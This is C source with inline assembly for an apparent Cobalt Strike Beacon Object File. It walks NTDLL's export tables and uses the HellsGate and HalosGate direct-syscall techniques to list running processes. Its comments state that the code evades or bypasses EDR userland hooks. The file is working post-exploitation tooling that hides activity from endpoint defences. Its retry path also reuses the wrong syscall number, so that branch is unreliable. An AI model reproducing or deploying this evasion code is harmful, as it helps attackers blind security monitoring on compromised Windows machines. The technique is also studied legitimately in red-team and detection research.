/*
Author: Bobby Cooke @0xBoku | https://github.com/boku7 | https://0xBoku.com | https://www.linkedin.com/in/bobby-cooke/
Credits / References: Reenz0h from @SEKTOR7net, Pavel Yosifovich (@zodiacon), @smelly__vx & @am0nsec
*/
#include <windows.h>
#include "beacon.h"
#include "structs.h"

__asm__("getntdll: \n\
  xor rdi, rdi \n\
  mul rdi \n\
  mov rbx, gs:[rax+0x60] \n\
  mov rbx, [rbx+0x18] \n\
  mov rbx, [rbx+0x20] \n\
  mov rbx, [rbx] \n\
  mov rbx, [rbx+0x20] \n\
  mov rax, rbx \n\
  ret \n\
");
EXTERN_C PVOID getntdll();

__asm__("getExportTable: \n\
  mov rbx, rcx \n\
  mov r8, rcx \n\
  mov ebx, [rbx+0x3C] \n\
  add rbx, r8 \n\
  xor rcx, rcx \n\
  add cx, 0x88ff \n\
  shr rcx, 0x8 \n\
  mov edx, [rbx+rcx] \n\
  add rdx, r8 \n\
  mov rax, rdx \n\
  ret \n\
");
EXTERN_C PVOID getExportTable(
	IN PVOID moduleAddr
);

// RCX = &NTDLL.ExportTable | RDX = &NTDLL.DLL
__asm__("getExAddressTable: \n\
  xor rax, rax \n\
  add rcx, 0x1C \n\
  mov eax, dword ptr [rcx] \n\
  add rax, rdx \n\
  ret \n\
");
EXTERN_C PVOID getExAddressTable(
	IN PVOID moduleExportTableAddr,
	IN PVOID moduleAddr
);

__asm__("getExNamePointerTable: \n\
  xor rax, rax \n\
  add rcx, 0x20 \n\
  mov eax, dword ptr [rcx] \n\
  add rax, rdx \n\
  ret \n\
");
EXTERN_C PVOID getExNamePointerTable(
	IN PVOID moduleExportTableAddr,
	IN PVOID moduleAddr
);

__asm__("getExOrdinalTable: \n\
  xor rax, rax \n\
  add rcx, 0x24 \n\
  mov eax, dword ptr [rcx] \n\
  add rax, rdx \n\
  ret \n\
");
EXTERN_C PVOID getExOrdinalTable(
	IN PVOID moduleExportTableAddr,
	IN PVOID moduleAddr
);

__asm__("getApiAddr: \n\
mov r11, [rsp+0x28] \n\
mov r10, [rsp+0x30] \n\
push rcx \n\
xor rax, rax \n\
jmp short getApiAddrLoop \n\
");
EXTERN_C PVOID getApiAddr(
	IN DWORD apiNameStringLen,
	IN LPSTR apiNameString,
	IN PVOID moduleAddr,
	IN PVOID ExExAddressTable,
	IN PVOID ExNamePointerTable,
	IN PVOID ExOrdinalTable
);

__asm__("getApiAddrLoop: \n\
mov rcx, [rsp] \n\
xor rdi, rdi \n\
xor rbx, rbx \n\
mov edi, [r11+rax*4] \n\
add rdi, r8 \n\
mov rsi, rdx \n\
repe cmpsb \n\
je getApiAddrFin \n\
inc rax \n\
jmp short getApiAddrLoop \n\
");

__asm__("getApiAddrFin: \n\
pop rcx \n\
mov ax, [r10+rax*2] \n\
mov eax, [r9+rax*4] \n\
add rax, r8 \n\
ret \n\
");


__asm__("findSyscallNumber: \n\
xor rsi, rsi \n\
xor rdi, rdi \n\
mov rsi, 0x00B8D18B4C \n\
mov edi, [rcx] \n\
cmp rsi, rdi \n\
jne error \n\
xor rax,rax \n\
mov ax, [rcx+4] \n\
ret \n\
");
EXTERN_C DWORD findSyscallNumber(
	IN PVOID ntdllApiAddr
);

__asm__("error: \n\
xor rax, rax \n\
ret \n\
");


__asm__("halosGateUp: \n\
xor rsi, rsi \n\
xor rdi, rdi \n\
mov rsi, 0x00B8D18B4C \n\
xor rax, rax \n\
mov al, 0x20 \n\
mul dx \n\
add rcx, rax \n\
mov edi, [rcx] \n\
cmp rsi, rdi \n\
jne error \n\
xor rax,rax \n\
mov ax, [rcx+4] \n\
ret \n\
");
EXTERN_C DWORD halosGateUp(
	IN PVOID ntdllApiAddr,
	IN WORD index
);

__asm__("halosGateDown: \n\
xor rsi, rsi \n\
xor rdi, rdi \n\
mov rsi, 0x00B8D18B4C \n\
xor rax, rax \n\
mov al, 0x20 \n\
mul dx \n\
sub rcx, rax \n\
mov edi, [rcx] \n\
cmp rsi, rdi \n\
jne error \n\
xor rax,rax \n\
mov ax, [rcx+4] \n\
ret \n\
");
EXTERN_C DWORD halosGateDown(
	IN PVOID ntdllApiAddr,
	IN WORD index
);

__asm__("HellsGate: \n\
xor r11, r11 \n\
mov r11d, ecx \n\
ret \n\
");
EXTERN_C VOID HellsGate(
	IN WORD wSystemCall
);

__asm__("HellDescent: \n\
  xor rax, rax \n\
  mov r10, rcx \n\
  mov eax, r11d \n\
  syscall \n\
  ret \n\
");
extern HellDescent();

void go(char * args, int len) {
	datap parser;
	int verbose;
	BeaconDataParse(&parser, args, len);
	verbose = BeaconDataInt(&parser);
	//BeaconPrintf(CALLBACK_OUTPUT, "[+] %d ", verbose);

	// Position Independent Shellcode to resolve the address of NTDLL.DLL
	PVOID ntdll = getntdll();
	if (verbose){
		BeaconPrintf(CALLBACK_OUTPUT, "[+] %p : &NTDLL.DLL", ntdll);
	}

	// Resolve NTDLL.ExportTable
	PVOID ntdllExportTable = getExportTable(ntdll);
	if (verbose){
		BeaconPrintf(CALLBACK_OUTPUT, "[+] %p : &NTDLL.ExportTable", ntdllExportTable);
	}

	// Resolve NTDLL.ExportTable.AddressTable
	PVOID ntdllExAddrTbl = getExAddressTable(ntdllExportTable, ntdll);
	if (verbose){
		BeaconPrintf(CALLBACK_OUTPUT, "[+] %p : &NTDLL.ExportTable.AddressTable", ntdllExAddrTbl);
	}
	
	// Resolve NTDLL.ExportTable.NamePointerTable
	PVOID ntdllExNamePtrTbl = getExNamePointerTable(ntdllExportTable, ntdll);
	if (verbose){
		BeaconPrintf(CALLBACK_OUTPUT, "[+] %p : &NTDLL.ExportTable.NamePointerTable", ntdllExNamePtrTbl);
	}

	// Resolve NTDLL.ExportTable.OrdinalTable
	PVOID ntdllExOrdinalTbl = getExOrdinalTable(ntdllExportTable, ntdll);
	if (verbose){
		BeaconPrintf(CALLBACK_OUTPUT, "[+] %p : &NTDLL.ExportTable.OrdinalTable", ntdllExOrdinalTbl);
	}

	// Find the address of NTDLL.NtQuerySystemInformation by looping through NTDLL export tables
	char ntQrySysInfoStr[] = "NtQuerySystemInformation";
	DWORD ntQrySysInfoStrLen = sizeof(ntQrySysInfoStr);

	if (verbose){
		BeaconPrintf(CALLBACK_OUTPUT,"[-] Looping through NTDLL Export tables to discover the address for NTDLL.%s..", ntQrySysInfoStr);
	}
	PVOID ntQrySysInfoAddr = getApiAddr(
		ntQrySysInfoStrLen,
		ntQrySysInfoStr,
		ntdll,
		ntdllExAddrTbl,
		ntdllExNamePtrTbl,
		ntdllExOrdinalTbl
	);
	if (verbose){
		BeaconPrintf(CALLBACK_OUTPUT,"[+] %p : NTDLL.%s Address", ntQrySysInfoAddr, ntQrySysInfoStr);
	}
	if (verbose){
		BeaconPrintf(CALLBACK_OUTPUT,"[-] Using HellsGate technique to discover syscall for %s..", ntQrySysInfoStr);
	}

	// HellsGate technique to recover the systemcall number
	DWORD ntQrySysInfoSyscallNumber = findSyscallNumber(ntQrySysInfoAddr);

	// HalosGate technique to recover the systemcall number. Used when stub in NTDLL is hooked. This evades/bypasses EDR Userland hooks
	if (ntQrySysInfoSyscallNumber == 0) {
		if (verbose){
			BeaconPrintf(CALLBACK_OUTPUT,"[!] Failed to discover the syscall number for %s. The API is likely hooked by EDR", ntQrySysInfoStr);
		}
		if (verbose){
			BeaconPrintf(CALLBACK_OUTPUT,"[-] Using HalosGate technique to discover syscall for %s..", ntQrySysInfoStr);
		}
		DWORD index = 0;
		while (ntQrySysInfoSyscallNumber == 0) {
			index++;
			// Check for unhooked Sycall Above the target stub
			ntQrySysInfoSyscallNumber = halosGateUp(ntQrySysInfoAddr, index);
			if (ntQrySysInfoSyscallNumber) {
				ntQrySysInfoSyscallNumber = ntQrySysInfoSyscallNumber - index;
				break;
			}
			// Check for unhooked Sycall Below the target stub
			ntQrySysInfoSyscallNumber = halosGateDown(ntQrySysInfoAddr, index);
			if (ntQrySysInfoSyscallNumber) {
				ntQrySysInfoSyscallNumber = ntQrySysInfoSyscallNumber + index;
				break;
			}
		}
	}
	if (verbose){
		BeaconPrintf(CALLBACK_OUTPUT,"[+] %x : Syscall number for NTDLL.%s", ntQrySysInfoSyscallNumber, ntQrySysInfoStr);
	}

	// Find the address of NTDLL.NtAllocateVirtualMemory by looping through NTDLL export tables
	char ntAllocVMStr[] = "NtAllocateVirtualMemory";
	DWORD ntAllocVMStrLen = sizeof(ntAllocVMStr);
	PVOID ntAllocVMAddr = getApiAddr(
		ntAllocVMStrLen,
		ntAllocVMStr,
		ntdll,
		ntdllExAddrTbl,
		ntdllExNamePtrTbl,
		ntdllExOrdinalTbl
	);
	if (verbose){
		BeaconPrintf(CALLBACK_OUTPUT,"[+] %p : NTDLL.%s Address", ntAllocVMAddr, ntAllocVMStr);
		BeaconPrintf(CALLBACK_OUTPUT,"[-] Using HellsGate technique to discover syscall for %s..", ntAllocVMStr);
	}
	// HellsGate technique to recover the systemcall number
	DWORD ntAllocVMSyscallNumber = findSyscallNumber(ntAllocVMAddr);

	// HalosGate technique to recover the systemcall number. Used when stub in NTDLL is hooked. This evades/bypasses EDR Userland hooks
	if (ntAllocVMSyscallNumber == 0) {
		if (verbose){
			BeaconPrintf(CALLBACK_OUTPUT,"[!] Failed to discover the syscall number for %s. The API is likely hooked by EDR", ntAllocVMStr);
			BeaconPrintf(CALLBACK_OUTPUT,"[-] Using HalosGate technique to discover syscall for %s..", ntAllocVMStr);
		} 
		DWORD index = 0;
		while (ntAllocVMSyscallNumber == 0) {
			index++;
			// Check for unhooked Sycall Above the target stub
			ntAllocVMSyscallNumber = halosGateUp(ntAllocVMAddr, index);
			if (ntAllocVMSyscallNumber) {
				ntAllocVMSyscallNumber = ntAllocVMSyscallNumber - index;
				break;
			}
			// Check for unhooked Sycall Below the target stub
			ntAllocVMSyscallNumber = halosGateDown(ntAllocVMAddr, index);
			if (ntAllocVMSyscallNumber) {
				ntAllocVMSyscallNumber = ntAllocVMSyscallNumber + index;
				break;
			}
		}
	}
	if (verbose){
		BeaconPrintf(CALLBACK_OUTPUT,"[+] %x : Syscall number for NTDLL.%s", ntAllocVMSyscallNumber, ntAllocVMStr);
	}

	// Allocate the buffer for the process information returned from NtQuerySystemInformation
	ULONG size = 1 << 18;
	PVOID base_addr = NULL;
	SIZE_T buffSize1 = (SIZE_T)size;
	ULONG required = 0;

	// NtAllocateVirtualMemory
	HellsGate(ntAllocVMSyscallNumber);
	HellDescent((HANDLE)-1, &base_addr, 0, &buffSize1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// NtQuerySystemInformation
	HellsGate(ntQrySysInfoSyscallNumber);
	NTSTATUS status = HellDescent(SystemProcessInformation, base_addr, size, &required);

	if (status == STATUS_BUFFER_TOO_SMALL) {
		size = required + (1 << 14);
		SIZE_T buffSize2 = size;
		// NtAllocateVirtualMemory
		HellsGate(ntAllocVMSyscallNumber);
		HellDescent((HANDLE)-1, &base_addr, 0, &buffSize2, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	}

	NTSTATUS status2 = HellDescent(SystemProcessInformation, base_addr, size, &required);

	SYSTEM_PROCESS_INFORMATION* procinfo = (SYSTEM_PROCESS_INFORMATION*)base_addr;
	BeaconPrintf(CALLBACK_OUTPUT,"   PID    PPID    Name");
	BeaconPrintf(CALLBACK_OUTPUT,"   ---    ----    ----");
	while (TRUE) {
		BeaconPrintf(CALLBACK_OUTPUT," %5u   %5u    %ws",
			HandleToULong(procinfo->UniqueProcessId),
			HandleToULong(procinfo->InheritedFromUniqueProcessId),
			procinfo->ImageName.Buffer
		);
		if (procinfo->NextEntryOffset == 0){
			break;
		}
		procinfo = (SYSTEM_PROCESS_INFORMATION*)((BYTE*)procinfo + procinfo->NextEntryOffset);
	}
	return;

}
